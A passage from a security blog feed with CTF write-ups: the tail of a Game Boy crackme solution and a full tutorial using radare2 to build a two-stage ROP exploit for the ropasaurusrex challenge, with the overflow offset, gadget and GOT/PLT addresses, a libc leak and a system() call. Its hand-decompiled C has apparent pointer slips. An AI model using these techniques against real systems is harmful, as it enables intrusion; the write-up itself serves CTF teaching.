</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x02</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">||</span> <span class="n">num_correct</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x04</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x08</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">||</span> <span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">10</span> <span class="o">||</span> <span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">11</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">8</span> <span class="o">||</span> <span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x80</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="o">*</span><span class="n">prev_press</span> <span class="o">=</span> <span class="o">*</span><span class="n">curr_press</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">!=</span> <span class="mh">0x0D</span><span class="p">);</span>
</span><span class='line'>  <span class="n">winner</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The only thing left to do is to cross reference the button presses with their
values, and extract the order from that code.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mi">4</span> <span class="o">-</span> <span class="n">up</span>
</span><span class='line'><span class="mi">1</span> <span class="o">-</span> <span class="n">right</span>
</span><span class='line'><span class="mi">8</span> <span class="o">-</span> <span class="n">down</span>
</span><span class='line'><span class="mi">2</span> <span class="o">-</span> <span class="n">left</span>
</span><span class='line'><span class="mi">4</span> <span class="o">-</span> <span class="n">up</span>
</span><span class='line'><span class="mi">1</span> <span class="o">-</span> <span class="n">right</span>
</span><span class='line'><span class="mi">8</span> <span class="o">-</span> <span class="n">down</span>
</span><span class='line'><span class="mi">2</span> <span class="o">-</span> <span class="n">left</span>
</span><span class='line'><span class="mi">20</span> <span class="o">-</span> <span class="n">B</span>
</span><span class='line'><span class="mi">20</span> <span class="o">-</span> <span class="n">B</span>
</span><span class='line'><span class="mi">10</span> <span class="o">-</span> <span class="n">A</span>
</span><span class='line'><span class="mi">10</span> <span class="o">-</span> <span class="n">A</span>
</span><span class='line'><span class="mi">80</span> <span class="o">-</span> <span class="n">Start</span>
</span><span class='line'><span class="o">---------</span><span class="n">values</span><span class="o">-----------------</span>
</span><span class='line'><span class="err">$</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Start</span>             <span class="err">$</span><span class="mi">8</span> <span class="o">-</span> <span class="n">Down</span>
</span><span class='line'><span class="err">$</span><span class="mi">40</span> <span class="o">-</span> <span class="n">Select</span>            <span class="err">$</span><span class="mi">4</span> <span class="o">-</span> <span class="n">Up</span>
</span><span class='line'><span class="err">$</span><span class="mi">20</span> <span class="o">-</span> <span class="n">B</span>                 <span class="err">$</span><span class="mi">2</span> <span class="o">-</span> <span class="n">Left</span>
</span><span class='line'><span class="err">$</span><span class="mi">10</span> <span class="o">-</span> <span class="n">A</span>                 <span class="err">$</span><span class="mi">1</span> <span class="o">-</span> <span class="n">Right</span>
</span></code></pre></td></tr></table></div></figure>


<p>Plug it in to VisualBoyAdvance and grab our 200 points!</p>

<p><img src="http://i.imgur.com/5Zel4aQ.png" alt="win.png" /></p>

<p>Thanks to FluxFingers for a great CTF!</p>

<p>Comments? Questions?
<code>crowell@shellphish.net</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning With Radare2]]></title>
    <link href="http://crowell.github.io/blog/2014/11/23/pwning-with-radare2/"/>
    <updated>2014-11-23T22:42:33-05:00</updated>
    <id>http://crowell.github.io/blog/2014/11/23/pwning-with-radare2</id>
    <content type="html"><![CDATA[<p>radare2 is a very cool set of tools that you probably don&rsquo;t know how to use!
Let&rsquo;s go through a simple exploit CTF challenge to understand how to use it for
exploit development.</p>

<p>We&rsquo;ll be focusing on &ldquo;ropasaurus rex&rdquo; which is a simple challenge from Plaid CTF
After checking out the latest and greatest radare from git, let&rsquo;s get started!</p>

<p>Open up ropasaurusrex in r2 and call analyze on the binary.
We can list the functions with &ldquo;afl&rdquo;</p>

<p><img src="http://i.imgur.com/18NyivR.png" alt="Imgur" /></p>

<p>First thing to do, let&rsquo;s see how the binary looks. To disassemble, r2 uses the
<code>pd</code> directive. So let&rsquo;s disassemble the main function with <code>pdf @ main</code></p>

<p><img src="http://i.imgur.com/PAFblNt.png" alt="Imgur" /></p>

<p>Ok so main is a very simple function. We can &ldquo;decompile&rdquo; it by hand.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int main() {
</span><span class='line'>  fcn.0x80483f4();
</span><span class='line'>  sym.imp.write(stdout, str.WIN_n, 4);  // write is fd, string, len
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We can print the string to see what is being printed.</p>

<p><img src="http://i.imgur.com/Sp4IZjw.png" alt="Imgur" /></p>

<p>Ok, so time to see what happens in 0x80483f4</p>

<p><img src="http://i.imgur.com/yZW400k.png" alt="Imgur" /></p>

<p>Great, this function is also very simple.
Let&rsquo;s reverse it!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sub_0x80483f4() {
</span><span class='line'>  char buffer[0x88];
</span><span class='line'>  sym.imp.read(stdin, buffer, 0x100);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>So we see that 0x100 (256) bytes are read in.
&ldquo;buffer&rdquo; is on the stack size 0x88. This is size 136. We read in 256 bytes on
the stack buffer which is only size 136. Great, we found the vulnerability, but
don&rsquo;t stop now, Let&rsquo;s get a shell, radare2 has some more tools that can help us
with that.</p>

<p>Let&rsquo;s check what protections are on the binary. We know our machine runs with
ASLR (and if your&rsquo;s doesn&rsquo;t why not!?!?)</p>

<p>I like to use the tool &ldquo;checksec.sh&rdquo; from trapkit.de</p>

<p><img src="http://i.imgur.com/Hu0YuI9.png" alt="Imgur" /></p>

<p>Looks like nx is enabled. So, we&rsquo;re going to need to rop!
First thing to do, is find out how big our buffer is so that we can take control
of EIP.</p>

<p>ragg2 + radare2 can be used with De Bruijn patterns to find the offset.
We use ragg2 to generate the pattern, and r2 to find how far into the pattern
before the return address on the stack is overwritten.</p>

<p><img src="http://i.imgur.com/mPxdxJJ.png" alt="Imgur" /></p>

<p>Ok, great, so the exploit can be [140 bytes of padding|start of rop chain]</p>

<p>Because we have both read and write libc functions, we can create a rop chain
that will do the following.</p>

<ul>
<li>Leak libc address of write

<ul>
<li>Compute offset of <code>system</code> with the provided libc (I&rsquo;m using mine here on
ubuntu)</li>
</ul>
</li>
<li>Write our command to somewhere.</li>
<li>Return to vulnerable function, now we know the location of <code>system</code></li>
<li>Call <code>system</code> with our written string.</li>
</ul>


<p>So first, we should find the locations of <code>read</code> and <code>write</code> in the PLT</p>

<p><img src="http://i.imgur.com/wIS8uFD.png" alt="Imgur" /></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[0xf77db0d0]&gt; afl |grep read
</span><span class='line'>0x0804832c  6  1  sym.imp.read
</span><span class='line'>[0xf77db0d0]&gt; afl |grep write
</span><span class='line'>0x0804830c  6  1  sym.imp.write</span></code></pre></td></tr></table></div></figure>


<p>ok, so we can call either of those there.</p>

<p>As for the GOT, we can find it like so</p>

<p><img src="http://i.imgur.com/9B7LamN.png" alt="Imgur" /></p>

<p>To leak a libc address we&rsquo;ll want to read from the GOT entry of a known libc
function. We can see that read is in the GOT at 0x804961c.
Write is done as such.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssize_t write(int fildes, const void *buf, size_t nbyte);</span></code></pre></td></tr></table></div></figure>


<p>So something like this is what we want.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>write(1 /*stdout*/, 0x804961c /*read@got*/, 4 /*size to read*/);</span></code></pre></td></tr></table></div></figure>


<p>But then, how do we clean up the stack to go to our next function which is to
write our command? We need to pop 3 items off of the stack, and set the return
address to read. So first, let&rsquo;s find how to pop off the stack.
r2 has some great rop gadget search tools, so we need to find gadgets that do
the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pop ?
</span><span class='line'>pop ?
</span><span class='line'>pop ?
</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>


<p>Where <code>?</code> can be any register, we don&rsquo;t really care. This cleans up the stack
and gets us to the next return address. We can use the <code>/R</code> command for finding
gadgets.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[0x08048440]&gt; /R  pop,pop,pop,ret</span></code></pre></td></tr></table></div></figure>


<p>r2 gives us back a bunch of example gadgets. I see one here which looks nice.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  0x080484b6           5e  pop esi
</span><span class='line'>  0x080484b7           5f  pop edi
</span><span class='line'>  0x080484b8           5d  pop ebp
</span><span class='line'>  0x080484b9           c3  ret</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll refer to this as &ldquo;pppr&rdquo; for poppoppopret.
So, stage 1 of our payload can look like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 1
</span><span class='line'>--frame_1--
</span><span class='line'>[write@plt]
</span><span class='line'>[pppr     ] // return address
</span><span class='line'>[1        ]
</span><span class='line'>[read@got ]
</span><span class='line'>[4        ]
</span><span class='line'>--frame_2--
</span><span class='line'>[??       ]</span></code></pre></td></tr></table></div></figure>


<p>Next, we need to find a place to write our command string to system.
We can use the read function to do that. Read looks like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssize_t read(int fd, void *buf, size_t count);```</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s do</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>read(0 /*stdin*/, target, length of command);</span></code></pre></td></tr></table></div></figure>


<p>We now need a place to read the string to. ELF has different sections, with
different permissions. Some are read only, write only, execute only, or any
combination of the three! rabin2 lets us see the secitions and find the
permissions and sizes of each, so we can tell where to write to.
<img src="http://i.imgur.com/YsU1Blx.png" alt="Imgur" />
Perfect! there are plenty of sections. Generally I like to write to the <code>.bss</code>
section, but this is only size 8, which would limit our command. So let&rsquo;s pick
the <code>.dynamic</code> section. It is size 208, and we can write to it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>idx=20 vaddr=0x08049530 paddr=0x00000530 sz=208 vsz=208 perm=-rw- name=.dynamic</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll reuse the same pppr gadget, because write has the same number of args.
So now our rop chain can be.
I&rsquo;ll call 0x08049530 writeaddr, and len(cmd) the length of our command.
So this now leaks the libc address of read. Then calls read from stdin to a
memory address that we can write to. Then we need to return to our vulnerable
function to then execute the system address that we calculate.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 1
</span><span class='line'>--frame_1--
</span><span class='line'>[write@plt]
</span><span class='line'>[pppr     ] // return address
</span><span class='line'>[1        ]
</span><span class='line'>[read@got ]
</span><span class='line'>[4        ]
</span><span class='line'>--frame_2--
</span><span class='line'>[read@plt ]
</span><span class='line'>[pppr     ]
</span><span class='line'>[0        ]
</span><span class='line'>[writeaddr]
</span><span class='line'>[len(cmd) ]
</span><span class='line'>--frame_3--
</span><span class='line'>[vuln_func]</span></code></pre></td></tr></table></div></figure>


<p>In my libc, we can find the offsets of read and system. Because we leak the
libc address of read, we can compute where system is by doing the following
math.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>offset = libc_read - libc_system
</span><span class='line'>sys_addr = leaked_read_addr - offset</span></code></pre></td></tr></table></div></figure>


<p>I get the following addresses, using gdb instead of r2, because I dont know
how to do this quickly in r2 ;)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>minishwoods old/ropasaurusrex » gdb -q /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x40100 &lt;system&gt;
</span><span class='line'>gdb-peda$ p read
</span><span class='line'>$2 = {&lt;text variable, no debug info&gt;} 0xdb4b0 &lt;read&gt;</span></code></pre></td></tr></table></div></figure>


<p>Now all that is left is to do the same stack smash, then call system.
System looks like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int system(const char *command);</span></code></pre></td></tr></table></div></figure>


<p>So we just want</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>system(0x08049530 /*address of the string we wrote*/);</span></code></pre></td></tr></table></div></figure>


<p>Then were done! Stage 2 of the rop can be like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 2
</span><span class='line'>--frame_1--
</span><span class='line'>[system   ]
</span><span class='line'>[JUNK     ] //can be any 4 bytes, we dont care once we execute system()
</span><span class='line'>[writeaddr]</span></code></pre></td></tr></table></div></figure>


<p>Put it all together in a neat exploit like this
<a href="https://gist.github.com/48bcb49cb71f96b98367">https://gist.github.com/48bcb49cb71f96b98367</a>
and were all done!</p>
]]></content>
  </entry>
  
</feed>
